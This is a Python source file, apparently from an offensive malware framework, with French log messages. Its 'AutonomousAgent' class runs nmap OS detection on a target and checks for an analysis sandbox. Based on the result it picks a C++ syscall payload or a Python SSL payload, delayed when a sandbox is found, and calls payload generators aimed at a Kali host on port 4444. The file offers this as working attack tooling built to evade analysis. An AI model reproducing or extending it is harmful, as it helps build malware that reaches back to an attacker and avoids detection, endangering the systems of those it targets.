import subprocess
from core.config import Config
from modules.payload_generators.python_gen import PythonPayloadGenerator
from modules.payload_generators.cpp_gen import CppPayloadGenerator
from modules.obfuscators.sandbox_detector import SandboxDetector
from core.logger import Logger

logger = Logger()

class AutonomousAgent:
    def __init__(self):
        self.config = Config()
        self.target_ip = self.config.get("kali_ip", "192.168.1.100")
        self.target_port = self.config.get("kali_port", 4444)

    def analyze_target(self):
        is_sandbox = SandboxDetector.is_sandbox()
        try:
            result = subprocess.run(
                ["nmap", "-O", self.target_ip],
                capture_output=True, text=True, timeout=10
            )
            os_info = "Windows" if "Windows" in result.stdout else "Linux" if "Linux" in result.stdout else "Unknown"
        except:
            os_info = "Unknown"

        return {
            "is_sandbox": is_sandbox,
            "os": os_info,
            "ip": self.target_ip,
            "port": self.target_port
        }

    def decide_payload(self, target_info):
        if target_info["os"] == "Windows":
            if target_info["is_sandbox"]:
                logger.info("Sandbox détectée, utilisation d'un payload Python avec délai")
                return "python_delayed"
            else:
                logger.info("Windows normal, utilisation du payload C++ (syscalls)")
                return "cpp"
        else:
            logger.info("Cible non-Windows, utilisation du payload Python SSL")
            return "python"

    def execute(self, decision):
        if decision == "cpp":
            gen = CppPayloadGenerator()
            result = gen.run(self.config)
            logger.info(f"Payload C++ généré : {result}")
            return result
        elif decision == "python" or decision == "python_delayed":
            gen = PythonPayloadGenerator()
            result = gen.run(self.config)
            logger.info(f"Payload Python généré : {result}")
            return result
        else:
            logger.error("Décision inconnue")
            return None